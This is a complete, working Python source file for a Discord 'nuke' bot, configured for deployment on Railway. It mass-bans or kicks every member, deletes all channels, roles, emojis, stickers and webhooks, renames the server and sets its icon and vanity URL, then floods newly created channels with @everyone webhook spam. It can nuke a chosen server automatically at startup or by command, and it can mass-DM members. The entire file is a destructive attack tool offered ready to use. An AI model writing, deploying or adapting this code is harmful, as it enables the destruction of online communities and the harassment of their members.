# language: Python 3.11+, file: bot.py, target: Discord + Railway
# Nuke bot — max tolerant boot

from __future__ import annotations

import os
import sys
import asyncio
import logging
import traceback
from typing import Optional, List, Iterable

import aiohttp
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("nuke")

def env_str(key: str, default: str = "") -> str:
    v = os.getenv(key)
    if v is None:
        return default
    v = v.strip()
    # Railway users often paste "token" with quotes
    if len(v) >= 2 and ((v[0] == v[-1] == '"') or (v[0] == v[-1] == "'")):
        v = v[1:-1].strip()
    return v

def env_bool(key: str, default: bool = False) -> bool:
    v = (os.getenv(key) or str(default)).strip().lower()
    return v in ("1", "true", "yes", "on", "y")

def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default

def env_ids(key: str) -> set[int]:
    raw = env_str(key)
    out: set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out

# Accept TOKEN or DISCORD_TOKEN
TOKEN = env_str("TOKEN") or env_str("DISCORD_TOKEN")
OWNER_IDS = env_ids("OWNER_IDS") or env_ids("OWNER_ID")
PREFIX = env_str("PREFIX", "!") or "!"
PORT = env_int("PORT", 8080)

NUKE_NAME = env_str("NUKE_NAME", "NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
SPAM_MESSAGES = max(0, env_int("SPAM_MESSAGES", 15))
SPAM_TEXT = env_str("SPAM_TEXT", "@everyone NUKED") or "@everyone NUKED"
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = env_str("BAN_REASON", "nuked") or "nuked"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CHANGE_ICON = env_bool("CHANGE_ICON", False)
ICON_URL = env_str("ICON_URL")
CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
BANNER_URL = env_str("BANNER_URL")
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 10))
ROLE_NAME = env_str("ROLE_NAME", "nuked") or "nuked"
CHANNEL_NAME = env_str("CHANNEL_NAME", "nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 5))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
DM_MESSAGE = env_str("DM_MESSAGE")
LOG_WEBHOOK = env_str("LOG_WEBHOOK")
AUTO_NUKE_GUILD = env_str("AUTO_NUKE_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.2))
PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
VANITY = env_str("VANITY")
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))

log.info("=== NUKE BOT BOOT ===")
log.info("python=%s", sys.version.split()[0])
log.info("PORT=%s", PORT)
log.info("TOKEN present=%s length=%s prefix=%s", bool(TOKEN), len(TOKEN), (TOKEN[:8] + "…") if len(TOKEN) > 8 else TOKEN)
log.info("OWNER_IDS=%s", OWNER_IDS or "(empty — commands disabled)")

intents = discord.Intents.none()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis = True
intents.emojis_and_stickers = True

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=False,
)

sem: asyncio.Semaphore | None = None
_http: aiohttp.ClientSession | None = None
_bot_ready = False

def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        if not OWNER_IDS:
            await ctx.send("OWNER_IDS manquant sur Railway.")
            return False
        return ctx.author.id in OWNER_IDS
    return commands.check(pred)

async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http

async def external_log(msg: str):
    if not LOG_WEBHOOK:
        return
    try:
        session = await get_http()
        await session.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
    except Exception:
        pass

async def say(msg: str):
    log.info(msg)
    await external_log(msg)

async def limited(coro):
    assert sem is not None
    async with sem:
        try:
            return await coro
        except HTTPException as e:
            if e.status == 429:
                retry = 1.5
                try:
                    if e.response is not None:
                        retry = float(e.response.headers.get("Retry-After", 1.5))
                except Exception:
                    pass
                await asyncio.sleep(retry)
                try:
                    return await coro
                except Exception:
                    return None
            return None
        except (Forbidden, NotFound):
            return None
        except Exception:
            return None
        finally:
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)

async def gather_limited(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    if not tasks:
        return []
    return await asyncio.gather(*tasks, return_exceptions=True)

async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        log.warning("chunk: %s", e)
    return list(guild.members)

async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me, owner = guild.me, guild.owner
    members = await fetch_members(guild)
    targets = []
    for m in members:
        if me and m.id == me.id:
            continue
        if SKIP_OWNER and owner and m.id == owner.id:
            continue
        if SKIP_BOTS and m.bot:
            continue
        targets.append(m)

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE)
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    results = await gather_limited(one(m) for m in targets)
    return sum(1 for r in results if r == 1)

async def action_delete_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1
    results = await gather_limited(one(ch) for ch in list(guild.channels))
    return sum(1 for r in results if r == 1)

async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = [r for r in guild.roles if not r.is_default() and not r.managed and not (me and r >= me.top_role)]
    async def one(role):
        await role.delete()
        return 1
    results = await gather_limited(one(r) for r in roles)
    return sum(1 for r in results if r == 1)

async def action_delete_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1
    results = await gather_limited(one(e) for e in list(guild.emojis))
    return sum(1 for r in results if r == 1)

async def action_delete_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1
    results = await gather_limited(one(s) for s in list(guild.stickers))
    return sum(1 for r in results if r == 1)

async def action_delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
    except Exception:
        return 0
    async def one(wh):
        await wh.delete()
        return 1
    results = await gather_limited(one(w) for w in webhooks)
    return sum(1 for r in results if r == 1)

async def download_bytes(url: str) -> Optional[bytes]:
    if not url:
        return None
    try:
        session = await get_http()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                return await resp.read()
    except Exception:
        pass
    return None

async def action_rename(guild: discord.Guild, name: str) -> bool:
    kwargs = {"name": name[:100]}
    if CHANGE_ICON and ICON_URL:
        data = await download_bytes(ICON_URL)
        if data:
            kwargs["icon"] = data
    if CHANGE_BANNER and BANNER_URL:
        data = await download_bytes(BANNER_URL)
        if data:
            kwargs["banner"] = data
    try:
        await guild.edit(**kwargs)
        return True
    except Exception as e:
        log.warning("rename: %s", e)
        return False

async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    created: List[discord.TextChannel] = []
    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")
    results = await gather_limited(one(i) for i in range(n))
    for r in results:
        if isinstance(r, discord.TextChannel):
            created.append(r)
    return created

async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1
    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)

async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        for _ in range(times):
            try:
                await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
            except Exception:
                break
            if RATE_LIMIT_DELAY:
                await asyncio.sleep(RATE_LIMIT_DELAY)
        return 1
    await gather_limited(one(ch) for ch in channels)

async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            wh = await ch.create_webhook(name="nuke")
            for _ in range(times):
                try:
                    await wh.send(text, username="NUKE", allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
                if RATE_LIMIT_DELAY:
                    await asyncio.sleep(RATE_LIMIT_DELAY)
        except Exception:
            for _ in range(times):
                try:
                    await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    break
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1
    await gather_limited(one(ch) for ch in channels)

async def action_dm_all(guild: discord.Guild, message: str) -> int:
    members = await fetch_members(guild)
    async def one(m: discord.Member):
        if m.bot or (guild.me and m.id == guild.me.id):
            return 0
        await m.send(message)
        return 1
    results = await gather_limited(one(m) for m in members)
    return sum(1 for r in results if r == 1)

async def action_prune(guild: discord.Guild, days: int) -> int:
    if days <= 0:
        return 0
    try:
        return await guild.prune_members(days=days, reason=BAN_REASON)
    except Exception:
        return 0

async def action_vanity(guild: discord.Guild, code: str) -> bool:
    if not code:
        return False
    try:
        await guild.edit(vanity_code=code)
        return True
    except Exception as e:
        log.warning("vanity: %s", e)
        return False

async def full_nuke(guild: discord.Guild):
    await say(f"[*] NUKE START → {guild.name} ({guild.id})")
    if BAN_ALL:
        n = await action_ban_all(guild, kick=KICK_INSTEAD)
        await say(f"[+] Ban/Kick: {n}")
    if PRUNE_DAYS > 0:
        n = await action_prune(guild, PRUNE_DAYS)
        await say(f"[+] Prune: {n}")
    if DELETE_WEBHOOKS:
        n = await action_delete_webhooks(guild)
        await say(f"[+] Webhooks: {n}")
    n = await action_delete_channels(guild)
    await say(f"[+] Channels deleted: {n}")
    if DELETE_ROLES:
        n = await action_delete_roles(guild)
        await say(f"[+] Roles deleted: {n}")
    if DELETE_EMOJIS:
        n = await action_delete_emojis(guild)
        await say(f"[+] Emojis: {n}")
    if DELETE_STICKERS:
        n = await action_delete_stickers(guild)
        await say(f"[+] Stickers: {n}")
    ok = await action_rename(guild, NUKE_NAME)
    await say(f"[+] Rename: {ok}")
    if VANITY:
        ok = await action_vanity(guild, VANITY)
        await say(f"[+] Vanity: {ok}")
    if CREATE_ROLES:
        n = await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)
        await say(f"[+] Roles created: {n}")
    if CREATE_CATEGORIES:
        n = await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)
        await say(f"[+] Categories: {n}")
    if CREATE_VOICE:
        n = await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)
        await say(f"[+] Voice: {n}")
    channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
    await say(f"[+] Text channels: {len(channels)}")
    if channels and SPAM_MESSAGES > 0:
        if WEBHOOK_SPAM:
            await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
        await say("[+] Spam done")
    await say("[*] NUKE COMPLETE")

async def health_handler(_request):
    body = "online" if _bot_ready else "starting"
    return web.Response(text=body, status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("Health OK on 0.0.0.0:%s", PORT)

@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("===== BOT ONLINE as %s =====", bot.user)
    log.info("guilds=%s owners=%s", len(bot.guilds), OWNER_IDS)
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        g = bot.get_guild(int(AUTO_NUKE_GUILD))
        if g:
            log.info("AUTO_NUKE → %s", g.name)
            await full_nuke(g)
        else:
            log.warning("AUTO_NUKE guild %s not found", AUTO_NUKE_GUILD)

async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info("alive | ready=%s guilds=%s latency=%.0fms", _bot_ready, len(bot.guilds), bot.latency * 1000)

@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    log.error("cmd: %s", error)
    try:
        await ctx.send(f"Erreur: `{error}`")
    except Exception:
        pass

@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error("event %s\n%s", event_method, traceback.format_exc())

@bot.command(name="nuke")
@owner_only()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild introuvable.")
        return
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(f"Nuke → **{target.name}**")
    await full_nuke(target)

@bot.command(name="banall")
@owner_only()
async def cmd_banall(ctx: commands.Context):
    await ctx.send(f"Banned: {await action_ban_all(ctx.guild, False)}")

@bot.command(name="kickall")
@owner_only()
async def cmd_kickall(ctx: commands.Context):
    await ctx.send(f"Kicked: {await action_ban_all(ctx.guild, True)}")

@bot.command(name="delchannels")
@owner_only()
async def cmd_delchannels(ctx: commands.Context):
    await ctx.send(f"Channels: {await action_delete_channels(ctx.guild)}")

@bot.command(name="delroles")
@owner_only()
async def cmd_delroles(ctx: commands.Context):
    await ctx.send(f"Roles: {await action_delete_roles(ctx.guild)}")

@bot.command(name="delemojis")
@owner_only()
async def cmd_delemojis(ctx: commands.Context):
    e = await action_delete_emojis(ctx.guild)
    s = await action_delete_stickers(ctx.guild)
    await ctx.send(f"Emojis: {e} Stickers: {s}")

@bot.command(name="spam")
@owner_only()
async def cmd_spam(ctx: commands.Context, count: int = 20):
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    if WEBHOOK_SPAM:
        await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
    else:
        await action_spam_messages(channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(channels)}")

@bot.command(name="webhookspam")
@owner_only()
async def cmd_webhookspam(ctx: commands.Context, count: int = 20):
    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
    await action_webhook_spam(channels, SPAM_TEXT, SPAM_MESSAGES)
    await ctx.send(f"Webhook spam: {len(channels)}")

@bot.command(name="rename")
@owner_only()
async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
    await ctx.send(f"Rename: {await action_rename(ctx.guild, name)}")

@bot.command(name="createchannels")
@owner_only()
async def cmd_createchannels(ctx: commands.Context, n: int = 10):
    await ctx.send(f"Created: {len(await action_create_channels(ctx.guild, n, CHANNEL_NAME))}")

@bot.command(name="createroles")
@owner_only()
async def cmd_createroles(ctx: commands.Context, n: int = 10):
    await ctx.send(f"Roles: {await action_create_roles(ctx.guild, n, ROLE_NAME)}")

@bot.command(name="dmall")
@owner_only()
async def cmd_dmall(ctx: commands.Context, *, message: str):
    await ctx.send(f"DM: {await action_dm_all(ctx.guild, message)}")

@bot.command(name="prune")
@owner_only()
async def cmd_prune(ctx: commands.Context, days: int = 1):
    await ctx.send(f"Pruned: {await action_prune(ctx.guild, days)}")

@bot.command(name="vanity")
@owner_only()
async def cmd_vanity(ctx: commands.Context, code: str):
    await ctx.send(f"Vanity: {await action_vanity(ctx.guild, code)}")

@bot.command(name="leave")
@owner_only()
async def cmd_leave(ctx: commands.Context):
    await ctx.send("Leaving")
    await ctx.guild.leave()

@bot.command(name="guilds")
@owner_only()
async def cmd_guilds(ctx: commands.Context):
    lines = [f"{g.name} | {g.id} | {g.member_count}" for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")

@bot.command(name="status")
@owner_only()
async def cmd_status(ctx: commands.Context):
    await ctx.send(f"{bot.user} | guilds={len(bot.guilds)} | {round(bot.latency*1000)}ms | owners={OWNER_IDS}")

@bot.command(name="helpnuke")
@owner_only()
async def cmd_help(ctx: commands.Context):
    await ctx.send(f"`{PREFIX}nuke banall kickall delchannels delroles delemojis spam webhookspam rename dmall prune vanity leave guilds status`")

async def runner():
    await start_health_server()
    if not TOKEN:
        log.error("NO TOKEN — set Railway var TOKEN (or DISCORD_TOKEN)")
        while True:
            await asyncio.sleep(3600)
        return
    log.info("Connecting to Discord…")
    try:
        async with bot:
            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED — token invalid or revoked. Regenerate token on Discord Developer Portal.")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("BOT CRASH:\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)

def main():
    try:
        asyncio.run(runner())
    except Exception:
        log.error("MAIN:\n%s", traceback.format_exc())
        sys.exit(1)

if __name__ == "__main__":
    main()
